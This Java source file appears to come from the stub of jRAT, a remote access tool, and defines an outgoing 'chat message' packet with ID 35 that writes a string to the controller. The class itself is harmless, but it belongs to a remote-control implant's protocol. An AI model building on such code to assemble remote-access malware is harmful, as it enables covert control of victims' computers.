package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet35ChatMessage extends AbstractOutgoingPacket {

	private String message;

	public Packet35ChatMessage(String message) {
		this.message = message;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.message);
	}

	@Override
	public short getPacketId() {
		return 35;
	}

}
